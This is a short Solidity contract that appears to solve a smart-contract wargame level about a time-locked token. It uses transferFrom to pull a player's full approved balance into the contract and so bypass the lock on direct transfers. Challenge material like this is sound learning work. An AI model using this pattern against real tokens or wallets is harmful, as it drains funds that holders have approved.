// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IERC20.sol"; // remember change for Remix

contract NaughtyTransfer {
    address player = address(0xcDA1048cf97B65ED9fb852AE677F02a28bd09ad3);

    IERC20 naughtCoin =
        IERC20(address(0x182fC7D4d7FA59E157BAa4E7170e18e63B61F5c7));

    uint256 playerFunds = 1000000000000000000000000;

    function sneakyTransfer() public {
        naughtCoin.transferFrom(player, address(this), playerFunds);
    }
}
